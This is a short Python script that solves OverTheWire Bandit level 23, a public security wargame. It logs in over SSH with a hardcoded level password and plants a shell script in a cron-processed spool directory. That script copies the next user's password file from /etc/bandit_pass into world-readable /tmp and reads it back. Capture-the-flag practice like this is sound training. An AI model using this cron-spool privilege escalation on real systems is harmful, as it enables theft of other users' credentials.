#!/usr/bin/python3.9

"""This script is a solution to Overthewire Bandit level 23."""

import time
import paramiko

s = paramiko.SSHClient()
s.set_missing_host_key_policy(paramiko.AutoAddPolicy())

s.connect(
    "bandit.labs.overthewire.org",
    port=2220, 
    username="bandit23",
    password="QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G",
    look_for_keys=False, 
    allow_agent=False)

cmd = ["echo 'cp /etc/bandit_pass/bandit24 /tmp/sanlake.txt",
    ";chmod 777 /tmp/sanlake.txt' > /tmp/sanlake.sh",
    ";chmod 777 /tmp/sanlake.sh",
    ";cp -p /tmp/sanlake.sh /var/spool/bandit24/foo/",
    ";sleep 60",
    ";/bin/cat /tmp/sanlake.txt",
    ";rm /tmp/sanlake.sh"
    ]

print("[STATUS] Waiting for cron job (60 sec)")

stdin, stdout, stderr = s.exec_command(' '.join(cmd))

password = stdout.read().decode('utf-8')
password = password.strip()

if password and password.isalnum() and len(password) == 32:
    print("[PASSWORD]", password)
else:
    print(
        f"[FAIL]",
        f"[Password({len(password)}): {password}]")

stdin.close(); s.close()
